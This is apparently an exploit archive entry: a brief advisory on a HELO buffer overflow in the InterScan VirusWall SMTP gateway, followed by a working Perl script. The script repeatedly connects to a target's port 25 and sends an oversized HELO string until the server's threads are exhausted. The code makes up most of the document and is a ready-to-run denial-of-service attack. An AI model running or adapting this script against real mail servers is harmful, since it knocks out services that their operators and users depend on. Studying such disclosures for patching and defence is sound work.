source: http://www.securityfocus.com/bid/787/info

There is a buffer overflow in the HELO command of the smtp gateway which ships as part of the VirusWall product. This buffer overflow could be used to launch arbitrary code on the vulnerable server.

This issue was patched by InterScan, however even with the patch it is possible to cause a DoS of the mail server software by sending between 4075 and 4090 characters. 

#!/usr/bin/perl

# (c) Alain Thivillon & Stephane Aubert 
#     Herve Schauer Consultants 2000
#     http://www.hsc.fr/
#
#     Do not use this stuff against Microsoft MX hosts :)
#
# Crash Interscan SMTP Server on Windows NT Version 3.32 Builds 1011 and 1022
# Depending of debugger installed on NT, crash can be immediat if you use
# Drwatson.32.exe (new connections get stuck), or can be limited to single
# thread if Auto=0 in NT Debug key. Interscan limits number of running
# threads (default 25) so it' very easy to exhaust all threads and finally
# force answer to '452 Too Busy'

use Socket;
use FileHandle;

$vict=$ARGV[0];

$AF_INET = 2;
$SOCK_STREAM = 1;
$port=25;
$sockaddr = 'S n a4 x8';

($name, $aliases, $type, $len, $thataddr) = gethostbyname($vict);
$that = pack($sockaddr, $AF_INET, $port, $thataddr);

while (1) {
  $mysock=new FileHandle;
  socket($mysock, $AF_INET, $SOCK_STREAM, $proto) || die "socket failed\n";
  connect($mysock, $that) || die "Connect failed\n";
  select($mysock); $| = 1; select(STDOUT); $| = 1;

  $line = <$mysock>;
  print $line; 
  print $mysock "HELO ",'a'x4075,"\r\n";
  $line = <$mysock>;
  print $line; 
  close $mysock; 
}